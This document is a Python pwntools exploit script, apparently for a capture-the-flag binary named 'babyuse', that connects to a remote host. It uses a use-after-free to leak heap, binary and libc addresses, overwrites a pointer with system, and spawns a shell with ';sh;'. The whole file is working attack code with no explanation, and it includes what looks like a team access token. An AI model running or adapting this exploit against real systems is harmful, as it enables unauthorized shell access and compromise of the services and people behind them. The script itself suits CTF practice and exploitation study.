from pwn import *
#io = process('./babyuse')
io = remote('202.112.51.247', 3456)
context.log_level = 'debug'
pause()

def menu(idx):
    io.recvuntil('7. Exit')
    io.sendline(str(idx))

def buy(typ, length, name):
    menu(1)
    io.recvuntil('2. QBZ95')
    io.sendline(str(typ))
    io.recvuntil('Lenth of name')
    io.sendline(str(length))
    io.recvuntil('')
    io.sendline(name)
    io.recvuntil('succeed.')

def drop(idx):
    menu(6)
    io.recvuntil(':')
    io.sendline(str(idx))
    io.recvuntil('Deleted')

def use(idx):
    menu(5)
    io.recvuntil('4. Main menu')
    io.sendline(str(idx))

def select(idx):
    menu(2)
    io.recvuntil('Select a gun')
    io.sendline(str(idx))

def setname(idx, length, name):
    menu(4)
    io.recvuntil(':')
    io.sendline(str(idx))
    io.recvuntil('Lenth of name')
    io.sendline(str(length))
    io.recvuntil(':')
    io.sendline(name)
io.sendline('gpRGF622u64jnH6rlgoLgpqGQCjZL42c')

buy(1, 0x10, '1' * 0x0f) # 0
buy(2, 0x10, '2' * 0x0f) # 1
buy(2, 0x10, '3' * 0x0f) # 2
buy(2, 0x10, '4' * 0x0f) # 3

select(2)
drop(0)
drop(1)
drop(2)
drop(3)

menu(5) # use gun
io.recvuntil('Select gun ')
heap_addr = u32(io.recvn(4))
log.info('heap_addr :' + hex(heap_addr))
heap_main = heap_addr - 0x38
log.info('heap_main :' + hex(heap_main))
io.sendline('4') # ret to main

buy(2, 0x80, '5' * 0x7f) #0
buy(2, 0x10, '6' * 4 + p32(heap_main + 0xa0)) #1

menu(5) # use gun
io.recvuntil('Select gun ')
bin_addr = u32(io.recvn(4))
log.info('bin_addr :' + hex(bin_addr))
bin_main = bin_addr - 0x1d1c
log.info('bin_main :' + hex(bin_main))
io.sendline('4') # ret to main

setname(1, 0x10, '7' * 0xf)
setname(1, 0x10, '8' * 4 + p32(bin_main + 0x3ff0))

menu(5) # use gun
io.recvuntil('Select gun ')
puts_libc = u32(io.recvn(4))
log.info('puts_libc :' + hex(puts_libc))
l = ELF('./libc')
libc_main = puts_libc - l.symbols['puts']
log.info('libc_main :' + hex(libc_main))
system_libc = libc_main + l.symbols['system']
log.info('system_libc :' + hex(system_libc))
io.sendline('4') # ret to main

setname(1, 0x10, '9999' + p32(system_libc))
setname(1, 0x10, p32(heap_main + 0x88) + p32(bin_main + 0x3ff0) + ';sh;')


io.interactive()
